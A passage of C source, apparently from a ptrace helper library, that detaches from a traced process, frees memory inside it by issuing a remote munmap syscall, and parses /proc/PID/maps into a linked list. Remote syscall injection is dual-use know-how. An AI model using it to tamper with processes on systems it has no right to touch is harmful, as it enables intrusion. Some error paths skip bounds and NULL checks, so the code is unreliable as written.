					(int) (this_node->word_count * sizeof(long)), 0, 0, 0, 0, strerror(-retval));
		}	

		free(this_node->local_address);

		previous_node = this_node;
		this_node = this_node->next;
		free(previous_node);
	}

	if((retval = ptrace(PTRACE_SETREGS, target->pid, NULL, &(target->saved_regs))) == -1){
		fprintf(stderr, "%s: ptrace(%d, %d, %lx, %lx): %s\n", program_invocation_short_name, \
				(int) PTRACE_SETREGS, (int) target->pid, (long unsigned int) NULL, \
				(long unsigned int) &(target->saved_regs), strerror(errno));
	}

	if((retval = ptrace(PTRACE_DETACH, target->pid, NULL, NULL)) == -1){
		fprintf(stderr, "%s: ptrace(%d, %d, %lx, %lx): %s\n", program_invocation_short_name, \
				(int) PTRACE_DETACH, (int) target->pid, (long unsigned int) NULL, \
				(long unsigned int) NULL, strerror(errno));
	}

	free(target);
}


/**********************************************************************
 *
 *	void ptrace_do_free(struct ptrace_do *target, void *local_address, int operation)
 *
 *		Input:
 *			This sessions ptrace_do object, the local_address of the joint memory node,
 *			and the way you would like it freed.
 *
 *		Output:
 *			None.
 *
 *		Purpose:
 *			To dispose of unused objects, both local and / or remote. 
 *
 *		Operations:
 *			FREE_LOCAL   - Destroy the local data, but leave the remote data intact.
 *			FREE_REMOTE  - Destroy the remote data, but leave the local data intact.
 *			FREE_BOTH    - Destroy both the local and remote data.
 *
 *		Notes:
 *			Regardless of the operation chosen, the node associated with the local_address
 *			will be destroyed. 
 *
 *			This function is useful for using FREE_LOCAL to disassociate the remote 
 *			data with the controler process, while leaving it intact for use after a 
 *			PTRACE_DETACH call. Also, when you call ptrace_do_cleanup(), all 
 *			nodes that have not been manually delt with will be destroyed and the memory
 *			will be freed, both remote and local. 
 *
 **********************************************************************/
void ptrace_do_free(struct ptrace_do *target, void *local_address, int operation){
	int retval;
	struct mem_node *this_node, *previous_node;

	previous_node = NULL;
	this_node = target->mem_head;

	while(this_node){
		if(this_node->local_address == local_address){
			break;
		}	
		previous_node = this_node;
		this_node = this_node->next;
	}

	if(operation & FREE_REMOTE){
		if((retval = (int) ptrace_do_syscall(target, \
						__NR_munmap, this_node->remote_address, this_node->word_count * sizeof(long), \
						0, 0, 0, 0)) < 0){
			fprintf(stderr, "%s: ptrace_do_syscall(%lx, %d, %lx, %d, %d, %d, %d, %d): %s\n", \
					program_invocation_short_name, \
					(unsigned long) target, __NR_munmap, this_node->remote_address, \
					(int) (this_node->word_count * sizeof(long)), 0, 0, 0, 0, strerror(-retval));
		}	
	}

	if(operation & FREE_LOCAL){
		free(this_node->local_address);
	}

	if(previous_node){
		previous_node->next = this_node->next;
	}else{
		target->mem_head = this_node->next;
	}

	free(this_node);
}

//#include "libptrace_do.h"


#define PROC_STRING "/proc/"
#define MAPS_STRING "/maps"


// Internal helper functions don't need to make it into the main .h file.*/
struct parse_maps *parse_next_line(char *line);


/***********************************************************************************************************************
 *
 *	get_proc_pid_maps()
 *
 *		Input:
 *			The process id of the target.
 *
 *		Output:
 *			Pointer to a struct parse_maps object. NULL on error.
 *
 *		Purpose:
 *			The parse_maps object pointer will be a pointer to the head of a linked list. This list represents the 
 *			different regions of memory allocated by the kernel. This will be a reflection of the entries in the 
 *			/proc/PID/maps file.
 *
 **********************************************************************************************************************/
struct parse_maps *get_proc_pid_maps(pid_t target){

	struct parse_maps *map_head = NULL, *map_tail = NULL, *map_tmp;

	int fd, buffer_len;
	int ret_int;

	char *buffer;
	char *tmp_ptr;


	// I'm afraid that this function just parses a file and turns it into a linked list. Not very exciting.

	buffer_len = getpagesize();

	if((buffer = (char *) calloc(buffer_len, sizeof(char))) == NULL){
		fprintf(stderr, "calloc(%d, %d): %s\n", buffer_len, (int) sizeof(char), strerror(errno));
		goto CLEAN_UP;
	}


	tmp_ptr = buffer;
	memcpy(tmp_ptr, PROC_STRING, strlen(PROC_STRING));

	tmp_ptr = strchr(buffer, '\0');
	snprintf(tmp_ptr, (PATH_MAX - 1) - (strlen(PROC_STRING) + strlen(MAPS_STRING)), "%d", target);

	tmp_ptr = strchr(buffer, '\0');
	memcpy(tmp_ptr, MAPS_STRING, strlen(MAPS_STRING));

	if((fd = open(buffer, O_RDONLY)) == -1){
		fprintf(stderr, "open(%s, O_RDONLY): %s\n", buffer, strerror(errno));
		goto CLEAN_UP;
	}


	memset(buffer, 0, buffer_len);
	tmp_ptr = buffer;

	while((ret_int = read(fd, tmp_ptr, 1)) > 0){
		if(*tmp_ptr	== '\n'){
			*tmp_ptr = '\0';

			if((map_tmp = parse_next_line(buffer)) == NULL){
				fprintf(stderr, "parse_next_line(%s): %s\n", buffer, strerror(errno));
				goto CLEAN_UP;
			}

			if(!map_head){
				map_head = map_tmp;
				map_tail = map_tmp;
			}else{
				map_tail->next = map_tmp;
				map_tmp->previous = map_tail;
				map_tail = map_tmp;
			}

			memset(buffer, 0, buffer_len);
			tmp_ptr = buffer;

		}else{
			tmp_ptr++;
		}
	}

	if(ret_int == -1){
		fprintf(stderr, "read(%d, %lx, 1): %s\n", fd, (unsigned long) tmp_ptr, strerror(errno));
		goto CLEAN_UP;
	}


	free(buffer);
	close(fd);
	return(map_head);


CLEAN_UP:

	free(buffer);
	close(fd);
	free_parse_maps_list(map_head);
	return(NULL);
}


/***********************************************************************************************************************
 *
 *	parse_next_line()
 *
 *		Input:
 *			A pointer to the string that represents the next line of the file.
 *
 *		Output:
 *			A pointer to the next node, as created from this line.
 *
 *		Purpose:
 *			This is a helper function, not exposed externally. It parses a line and returns a node. Enough said. :)
 *
 **********************************************************************************************************************/
struct parse_maps *parse_next_line(char *line){

	struct parse_maps *node = NULL;
	char *token_head, *token_tail;

	// The comments mentioning data types are just trying to demonstrate
	// the type of data we will be parsing in that area.

	if((node = (struct parse_maps *) calloc(1, sizeof(struct parse_maps))) == NULL){
		fprintf(stderr, "calloc(1, %d): %s\n", (int) sizeof(struct parse_maps), strerror(errno));
		goto CLEAN_UP;
	}

	// unsigned long start_address;
	token_head = line;
	if((token_tail = strchr(token_head, '-')) == NULL){
		fprintf(stderr, "strchr(%s, '%c'): %s\n", token_head, '-', strerror(errno));
		goto CLEAN_UP;
	}

	*token_tail = '\0';
	node->start_address = strtoul(token_head, NULL, 16);

	// unsigned long end_address;
	token_head = token_tail + 1;
	if((token_tail = strchr(token_head, ' ')) == NULL){
		fprintf(stderr, "strchr(%s, '%c'): %s\n", token_head, ' ', strerror(errno));
		goto CLEAN_UP;
	}
	*token_tail = '\0';
	node->end_address = strtoul(token_head, NULL, 16);

	// unsigned int perms;
	token_head = token_tail + 1;
	if((token_tail = strchr(token_head, ' ')) == NULL){
		fprintf(stderr, "strchr(%s, '%c'): %s\n", token_head, ' ', strerror(errno));
		goto CLEAN_UP;
	}
	*token_tail = '\0';
	if(*(token_head++) == 'r'){
		node->perms |= MAPS_READ;
	}
	if(*(token_head++) == 'w'){
		node->perms |= MAPS_WRITE;
	}
	if(*(token_head++) == 'x'){
		node->perms |= MAPS_EXECUTE;
	}
	if(*token_head == 'p'){
		node->perms |= MAPS_PRIVATE;
	}else if(*token_head == 's'){
		node->perms |= MAPS_SHARED;
	}

	// unsigned long offset;
	token_head = token_tail + 1;
	if((token_tail = strchr(token_head, ' ')) == NULL){
		fprintf(stderr, "strchr(%s, '%c'): %s\n", token_head, ' ', strerror(errno));
		goto CLEAN_UP;
	}
	*token_tail = '\0';
	node->offset = strtoul(token_head, NULL, 16);

	// unsigned int dev_major;
	token_head = token_tail + 1;
	if((token_tail = strchr(token_head, ':')) == NULL){
		fprintf(stderr, "strchr(%s, '%c'): %s\n", token_head, ':', strerror(errno));
		goto CLEAN_UP;
	}
	*token_tail = '\0';
	node->dev_major = strtol(token_head, NULL, 16);

	// unsigned int dev_minor;
	token_head = token_tail + 1;
	if((token_tail = strchr(token_head, ' ')) == NULL){
		fprintf(stderr, "strchr(%s, '%c'): %s\n", token_head, ' ', strerror(errno));
		goto CLEAN_UP;
	}
	*token_tail = '\0';
	node->dev_minor = strtol(token_head, NULL, 16);

	// unsigned long inode;
	token_head = token_tail + 1;
	if((token_tail = strchr(token_head, ' ')) == NULL){
		fprintf(stderr, "strchr(%s, '%c'): %s\n", token_head, ' ', strerror(errno));
		goto CLEAN_UP;
	}
	*token_tail = '\0';
	node->inode = strtol(token_head, NULL, 10);

	// char pathname[PATH_MAX];
	token_head = token_tail + 1;
	if(*token_head){
		if((token_head = strrchr(token_head, ' ')) == NULL){
			fprintf(stderr, "strrchr(%s, '%c'): %s\n", token_head, ' ', strerror(errno));
			goto CLEAN_UP;
		}
		token_head++;
		memcpy(node->pathname, token_head, strlen(token_head));
	}

	return(node);

CLEAN_UP:
	free(node);
	return(NULL);
}


/***********************************************************************************************************************
 *
 *	free_parse_maps_list()
 *
 *		Input:
 *			A pointer to the head of the list.
 *
 *		Output:
 *			Nothing.
 *
 *		Purpose:
 *			Free the members of the linked list.
 *
 **********************************************************************************************************************/
void free_parse_maps_list(struct parse_maps *head){
	struct parse_maps *tmp;

	while(head){
		tmp = head->next;
		free(head);
		head = tmp;
	}
}


/***********************************************************************************************************************
 *
 *	dump_parse_maps_list()
 *
 *		Input:
 *			A pointer to the head of the list.
 *
 *		Output:
 *			Nothing, but it will print representations of the internal data to stdout.
 *
 *		Purpose:
 *			Show us what the linked list looks like. Mostly intended for debugging.
 *
 **********************************************************************************************************************/
void dump_parse_maps_list(struct parse_maps *head){

	while(head){
		printf("--------------------------------------------------------------------------------\n");	
		printf("node: %lx\n", (unsigned long) head);
		printf("--------------------------------------------------------------------------------\n");	
		printf("start_address:\t\t%lx\n", head->start_address);
		printf("end_address:\t\t%lx\n", head->end_address);
		printf("perms:\t\t\t%05x\n", head->perms);
		printf("offset:\t\t\t%lx\n", head->offset);
		printf("dev_major:\t\t%x\n", head->dev_major);
		printf("dev_minor:\t\t%x\n", head->dev_minor);
		printf("inode:\t\t\t%lx\n", head->inode);
		printf("pathname:\t\t%s\n", head->pathname);

		printf("parse_maps *next:\t%lx\n", (unsigned long) head->next);
		printf("parse_maps *previous:\t%lx\n", (unsigned long) head->previous);
		printf("\n");

		head = head->next;
	}
}